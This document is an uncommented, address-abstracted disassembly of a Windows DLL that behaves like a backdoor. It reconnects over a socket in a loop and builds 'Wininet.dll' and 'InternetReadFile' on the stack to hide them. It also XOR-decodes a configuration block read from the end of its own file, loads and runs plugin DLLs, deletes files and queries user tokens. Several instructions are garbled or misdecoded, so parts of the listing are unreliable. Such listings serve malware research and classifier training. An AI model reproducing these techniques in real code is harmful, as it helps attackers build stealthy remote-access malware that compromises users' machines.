push ebx
push ebx
mov [ rw-data ] eax
push [ esi ]
push r-xdata
push ebx
push ebx
call ebp
mov ecx [ esp + 0x14 ]
push rw-data
mov [ ecx + 0xc ] eax
call sub_10001609
push ebx
lea eax [ esp + 0x18 ]
push 0x4
push eax
push [ esi ]
mov [ esp + 0x24 ] 0x1770
call sub_1000173b
add esp 0x14
xor eax eax
lea edi [ esp + 0x1e4 ]
mov [ esp + 0x1e0 ] ebx
push 0x70
pop ecx
[ edi ]
mov ecx [ esp + 0x14 ]
lea eax [ esp + 0x1e0 ]
push eax
call sub_100025a1
push ebx
lea eax [ esp + 0x1e4 ]
push 0x1c4
push eax
push [ esi ]
call sub_1000173b
add esp 0x10
push ebx
push ebx
push [ esi ]
push sub_10001d16
push ebx
push ebx
call ebp
push rw-data
mov [ rw-data ] eax
call sub_10001609
pop ecx
push 0xffffffff
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
push rw-data
push [ rw-data ]
push edi
call [ WSAGetLastError@IAT ]
push eax
push rw-data
call sub_10001609
add esp 0x10
push [ esi ]
call [ closesocket@IAT ]
mov eax [ rw-data ]
cmp eax ebx
jne r-xdata
imul eax eax 0xea60
push eax
push 0xfa0
jmp r-xdata
call [ Sleep@IAT ]
jmp r-xdata
sub_100025a1
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
lea eax [ ebp - 0x24 ]
push edi
push eax
call [ rw-data ]
mov ebx [ ebp + 0x8 ]
push 0x27
pop ecx
mov esi rw-data
mov edi ebx
push 0x9
[ edi ] [ esi ]
pop ecx
lea edi [ ebx + 0x9c ]
lea esi [ ebp - 0x24 ]
push 0xf8
lea eax [ ebx + 0xc0 ]
push rw-data
[ edi ] [ esi ]
push eax
call memcpy
add esp 0xc
mov [ ebx + 0x1b8 ] 0x19d
mov eax [ rw-data ]
and [ ebx + 0x1c0 ] 0x0
push 0x1
mov [ ebx + 0x1bc ] eax
pop eax
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_10002610
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x124
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x24 ] esi
lea ebx [ esi + 0x104 ]
push [ ebx ]
push esi
push rw-data
call sub_10001609
and [ ebp - 0x128 ] 0x0
push 0x40
pop ecx
xor eax eax
lea edi [ ebp - 0x127 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x104
push rw-data
lea eax [ ebp - 0x128 ]
push eax
call memcpy
push rw-data
lea eax [ ebp - 0x128 ]
push eax
call strcat
push esi
lea eax [ ebp - 0x128 ]
push eax
call strcat
push esi
call sub_1000159d
add esp 0x2c
test eax eax
je r-xdata
or edi 0xffffffff
or edi 0xffffffff
mov [ ebp - 0x130 ] edi
push [ rw-data ]
push [ rw-data ]
push rw-data
push [ rw-data ]
push [ rw-data ]
push rw-data
lea eax [ ebp - 0x130 ]
push eax
call sub_10001874
add esp 0x1c
test eax eax
je r-xdata
push esi
push rw-data
call sub_10001609
pop ecx
pop ecx
push rw-data
push ebx
call [ GetProcAddress@IAT ]
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
push ebx
call [ FreeLibrary@IAT ]
jmp r-xdata
mov [ ebp - 0x4 ] edi
jmp r-xdata
mov eax [ ebx ]
mov [ ebp - 0x12c ] eax
push 0x0
push 0x4
push ebx
push [ ebp - 0x130 ]
call sub_1000173b
add esp 0x10
cmp eax edi
je r-xdata
push [ rw-data ]
push [ rw-data ]
push rw-data
push [ rw-data ]
push [ rw-data ]
push rw-data
call eax
add esp 0x18
push ebx
call [ FreeLibrary@IAT ]
push esi
push rw-data
call sub_10001609
mov [ ebp - 0x134 ] esi
push esi
call ??3@YAXPAX@Z
add esp 0xc
mov [ ebp - 0x4 ] edi
xor eax eax
jmp r-xdata
push ebx
call [ FreeLibrary@IAT ]
push 0x1
pop eax
push esi
push [ ebp - 0x130 ]
call sub_10001084
pop ecx
pop ecx
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
lea eax [ ebp - 0x128 ]
push eax
call [ LoadLibraryA@IAT ]
mov ebx eax
mov [ ebp - 0x1c ] ebx
test ebx ebx
jne r-xdata
jmp r-xdata
lea eax [ ebp - 0x128 ]
push eax
call [ DeleteFileA@IAT ]
sub_100027d5
mov esp [ ebp - 0x18 ]
push [ ebp - 0x1c ]
call [ FreeLibrary@IAT ]
push rw-data
call sub_10001609
pop ecx
or [ ebp - 0x4 ] 0xffffffff
push 0x1
pop eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_10002804
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
xor ebx ebx
push edi
push ebx
push ebx
push ebx
push ebx
push rw-data
call [ rw-data ]
mov esi eax
cmp esi ebx
mov [ ebp - 0x8 ] esi
je r-xdata
xor eax eax
jmp r-xdata
push ebx
push 0x84080500
push ebx
push ebx
push [ ebp + 0x8 ]
push esi
call [ rw-data ]
mov edi eax
cmp edi ebx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
xor esi esi
push esi
call [ rw-data ]
push [ ebp - 0x8 ]
call [ rw-data ]
push edi
call [ rw-data ]
push 0x1
pop eax
cmp [ ebp - 0x4 ] ebx
je r-xdata
mov al [ ebp + 0xb ]
xor al 0xd1
cmp al 0xd
je r-xdata
xor al al
cmp al 0xa
jne r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp + 0xb ] bl
push eax
lea eax [ ebp + 0xb ]
push 0x1
push eax
push edi
mov [ ebp - 0x4 ] ebx
call [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0xc ]
mov [ esi + ecx ] al
inc esi
cmp esi 0x15
jl r-xdata
sub_100028ab
dec [ ebx + 0x40383d ]
adc [ ecx - 0x42 ] bl
pushad
push edi
add [ eax ] dl
push rw-data
call sub_10001609
inc [ rw-data ]
cmp [ rw-data ] 0x5
pop ecx
jbe r-xdata
push esi
call edi
push 0x2710
call [ Sleep@IAT ]
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov [ rw-data ] 0x2
push esi
call [ EnterCriticalSection@IAT ]
call [ GetTickCount@IAT ]
sub eax [ rw-data ]
cmp eax 0x1d4c0
ja r-xdata
push esi
call edi
push rw-data
call sub_10001609
pop ecx
pop edi
xor eax eax
pop esi
retn 0x4
push 0x0
push eax
call [ TerminateThread@IAT ]
sub_1000292d
mov eax sub_10003090
call sub_10002f14
sub esp 0x598
push ebx
push esi
push edi
push rw-data
call sub_10001609
mov edi [ LoadLibraryA@IAT ]
mov [ esp ] rw-data
call edi
xor ebx ebx
mov [ ebp - 0x10 ] eax
cmp eax ebx
je r-xdata
push 0x1
pop eax
jmp r-xdata
mov esi [ GetProcAddress@IAT ]
push rw-data
push eax
call esi
push rw-data
mov [ rw-data ] eax
push [ ebp - 0x10 ]
call esi
push rw-data
mov [ rw-data ] eax
push [ ebp - 0x10 ]
call esi
push rw-data
mov [ rw-data ] eax
push [ ebp - 0x10 ]
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0x1c ]
push eax
mov [ ebp - 0x1c ] 0x57
mov [ ebp - 0x1b ] 0x69
mov [ ebp - 0x1a ] 0x6e
mov [ ebp - 0x19 ] 0x69
mov [ ebp - 0x18 ] 0x6e
mov [ ebp - 0x17 ] 0x65
mov [ ebp - 0x16 ] 0x74
mov [ ebp - 0x15 ] 0x2e
mov [ ebp - 0x14 ] 0x64
mov [ ebp - 0x13 ] 0x6c
mov [ ebp - 0x12 ] 0x6c
mov [ ebp - 0x11 ] bl
call edi
mov edi eax
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
push rw-data
push edi
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
lea eax [ ebp - 0x38 ]
push eax
push edi
mov [ ebp - 0x38 ] 0x49
mov [ ebp - 0x37 ] 0x6e
mov [ ebp - 0x36 ] 0x74
mov [ ebp - 0x35 ] 0x65
mov [ ebp - 0x34 ] 0x72
mov [ ebp - 0x33 ] 0x6e
mov [ ebp - 0x32 ] 0x65
mov [ ebp - 0x31 ] 0x74
mov [ ebp - 0x30 ] 0x52
mov [ ebp - 0x2f ] 0x65
mov [ ebp - 0x2e ] 0x61
mov [ ebp - 0x2d ] 0x64
mov [ ebp - 0x2c ] 0x46
mov [ ebp - 0x2b ] 0x69
mov [ ebp - 0x2a ] 0x6c
mov [ ebp - 0x29 ] 0x65
mov [ ebp - 0x28 ] bl
call esi
push 0x40
mov [ rw-data ] eax
pop ecx
xor eax eax
lea edi [ ebp - 0x5a3 ]
mov [ ebp - 0x5a4 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x115
xor eax eax
lea edi [ ebp - 0x49f ]
mov [ ebp - 0x4a0 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov esi 0x104
lea eax [ ebp - 0x5a4 ]
push esi
push eax
push [ ebp + 0x8 ]
call [ rw-data ]
test eax eax
je r-xdata
lea eax [ ebp - 0x5a4 ]
push rw-data
push eax
call [ fopen@IAT ]
pop ecx
cmp eax ebx
pop ecx
mov [ ebp + 0x8 ] eax
jne r-xdata
mov edi [ fseek@IAT ]
push ebx
push ebx
push eax
call edi
push 0x2
push ebx
push [ ebp + 0x8 ]
call edi
push [ ebp + 0x8 ]
call [ ftell@IAT ]
push ebx
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
call edi
mov eax [ ebp - 0x10 ]
push ebx
add eax 0xfffffba8
push eax
push [ ebp + 0x8 ]
call edi
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4a0 ]
push 0x1
pop edi
push edi
push 0x458
push eax
call [ fread@IAT ]
add esp 0x44
push [ ebp + 0x8 ]
call [ fclose@IAT ]
lea eax [ ebp - 0x4a0 ]
mov [ esp ] rw-data
push eax
call strcmp
pop ecx
test eax eax
pop ecx
jne r-xdata
push rw-data
call sub_10001609
pop ecx
mov eax edi
mov cl al
add cl 0x7b
xor [ ebp + eax - 0x487 ] cl
inc eax
cmp eax esi
jl r-xdata
cmp [ ebp - 0x37c ] ebx
je r-xdata
cmp [ ebp - 0x16c ] 0x2
je r-xdata
xor eax eax
lea eax [ ebp - 0x487 ]
push esi
push eax
push rw-data
call memcpy
lea eax [ ebp - 0x378 ]
push esi
push eax
push rw-data
call memcpy
mov eax [ ebp - 0x380 ]
add esp 0x18
mov [ rw-data ] eax
mov eax [ ebp - 0x54 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x50 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4c ]
mov [ rw-data ] eax
mov eax [ ebp - 0x16c ]
mov [ rw-data ] eax
lea eax [ ebp - 0x487 ]
push eax
push rw-data
call sub_10001609
pop ecx
pop ecx
push [ ebp - 0x380 ]
push rw-data
call sub_10001609
pop ecx
pop ecx
push [ ebp - 0x37c ]
push rw-data
call sub_10001609
pop ecx
lea eax [ ebp - 0x378 ]
pop ecx
push eax
push rw-data
call sub_10001609
pop ecx
pop ecx
push [ ebp - 0x50 ]
push rw-data
call sub_10001609
pop ecx
pop ecx
push [ ebp - 0x16c ]
push rw-data
call sub_10001609
pop ecx
lea eax [ ebp - 0x168 ]
pop ecx
push eax
push rw-data
call sub_10001609
pop ecx
pop ecx
push [ ebp - 0x64 ]
push rw-data
call sub_10001609
pop ecx
pop ecx
push [ ebp - 0x4c ]
push rw-data
call sub_10001609
pop ecx
pop ecx
push [ ebp - 0x54 ]
push rw-data
call sub_10001609
pop ecx
pop ecx
push [ ebp - 0x5c ]
push rw-data
call sub_10001609
pop ecx
pop ecx
push [ ebp - 0x58 ]
push rw-data
call sub_10001609
mov edi [ GetEnvironmentVariableA@IAT ]
pop ecx
pop ecx
push 0xf8
push rw-data
push rw-data
call edi
push esi
push rw-data
push rw-data
call edi
push rw-data
call [ rw-data ]
lea ecx [ ebp - 0x48 ]
call sub_10001c9b
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] ebx
call sub_1000225e
xor eax eax
mov cl al
add cl 0x41
xor [ ebp + eax - 0x378 ] cl
inc eax
cmp eax esi
jl r-xdata
mov [ rw-data ] edi
mov cl al
add cl 0x41
xor [ ebp + eax - 0x168 ] cl
inc eax
cmp eax esi
jl r-xdata
lea eax [ ebp - 0x168 ]
push esi
push eax
push rw-data
call memcpy
mov eax [ ebp - 0x64 ]
add esp 0xc
mov [ rw-data ] eax
mov eax [ ebp - 0x60 ]
mov [ rw-data ] eax
sub_10002d3a
push ebp
mov ebp esp
sub esp 0x10c
push esi
mov esi rw-data
push esi
call sub_1000159d
test eax eax
pop ecx
je r-xdata
and [ ebp - 0x10c ] 0x0
push edi
push 0x40
xor eax eax
pop ecx
lea edi [ ebp - 0x10b ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x104
lea eax [ ebp - 0x10c ]
push rw-data
push eax
call memcpy
lea eax [ ebp - 0x10c ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x10c ]
push esi
push eax
call strcat
add esp 0x1c
lea eax [ ebp - 0x10c ]
push eax
call [ LoadLibraryA@IAT ]
mov esi eax
pop edi
test esi esi
je r-xdata
push [ rw-data ]
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x4 ]
push [ rw-data ]
push rw-data
push [ rw-data ]
push [ rw-data ]
push rw-data
push eax
call sub_10001874
add esp 0x1c
test eax eax
je r-xdata
pop esi
leave
retn
push rw-data
push esi
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push 0x4
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] 0x1b65
call sub_1000173b
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov ecx [ ebp + 0x8 ]
sub ecx 0x0
je r-xdata
push esi
push [ ebp - 0x4 ]
call sub_10001084
pop ecx
test eax eax
pop ecx
je r-xdata
push rw-data
push 0x0
dec ecx
je r-xdata
push rw-data
push 0x1
jmp r-xdata
dec ecx
je r-xdata
call eax
pop ecx
pop ecx
push rw-data
push 0x2
jmp r-xdata
dec ecx
jne r-xdata
push esi
call [ FreeLibrary@IAT ]
push [ ebp + 0xc ]
push 0x3
jmp r-xdata
sub_10002ec0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_10002f33
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ _adjust_fdiv@IAT ]
cmp eax 0x1
mov ecx [ ecx ]
mov [ rw-data ] ecx
jne r-xdata
cmp [ rw-data ] eax
jle r-xdata
test eax eax
jne r-xdata
push 0x80
call [ malloc@IAT ]
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
xor eax eax
jmp r-xdata
dec [ rw-data ]
push 0x1
pop eax
mov eax [ rw-data ]
test eax eax
je r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
push rw-data
push rw-data
mov [ rw-data ] eax
call _initterm
inc [ rw-data ]
pop ecx
pop ecx
jmp r-xdata
retn 0xc
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
push eax
call [ free@IAT ]
and [ rw-data ] 0x0
pop ecx
pop esi
mov ecx [ esi ]
test ecx ecx
je r-xdata
sub esi 0x4
jmp r-xdata
call ecx
mov eax [ rw-data ]
cmp esi eax
jb r-xdata
_start
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test esi esi
jne r-xdata
cmp esi 0x1
je r-xdata
cmp [ rw-data ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
jne r-xdata
push edi
push esi
push ebx
call sub_10002f33
test eax eax
push edi
push esi
push ebx
call eax
test eax eax
je r-xdata
push edi
push esi
push ebx
call sub_10001000
cmp esi 0x1
mov [ ebp + 0xc ] eax
jne r-xdata
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
push esi
push ebx
call sub_10002f33
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
mov eax [ ebp + 0xc ]
push edi
push eax
push ebx
call sub_10002f33
cmp [ ebp + 0xc ] 0x0
je r-xdata
and [ ebp + 0xc ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp + 0xc ] eax
sub_10001c9b
push esi
mov esi ecx
push rw-data
or [ esi + 0x4 ] 0xffffffff
and [ esi + 0x8 ] 0x0
and [ esi + 0xc ] 0x0
mov [ esi ] r--data
call [ InitializeCriticalSection@IAT ]
mov eax esi
pop esi
retn
sub_10001cbf
push esi
mov esi ecx
call sub_10001cdb
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
pop ecx
sub_100027d1
push 0x1
pop eax
retn
sub_10002e76
push [ esp + 0x4 ]
push 0x3
call sub_10002d3a
push [ esp + 0xc ]
call ??3@YAXPAX@Z
add esp 0xc
xor eax eax
retn 0x4
Print32
xor eax eax
retn
__WSAFDIsSet
jmp [ __WSAFDIsSet@IAT ]
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
??2@YAPAXI@Z
jmp [ operator new@IAT ]
memset
jmp [ memset@IAT ]
strcat
jmp [ strcat@IAT ]
memcpy
jmp [ memcpy@IAT ]
strlen
jmp [ strlen@IAT ]
strcpy
jmp [ strcpy@IAT ]
_except_handler3
jmp [ _except_handler3@IAT ]
strcmp
jmp [ strcmp@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
sub_10002f14
push 0xffffffff
push eax
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0xc ]
mov [ fs : 0x0 ] esp
mov [ esp + 0xc ] ebp
lea ebp [ esp + 0xc ]
push eax
retn
_initterm
jmp [ _initterm@IAT ]
WTSQueryUserToken
jmp [ WTSQueryUserToken@IAT ]
sub_10003088
lea ecx [ ebp - 0x48 ]
jmp sub_10001cdb
sub_10003090
mov eax r--data
jmp __CxxFrameHandler
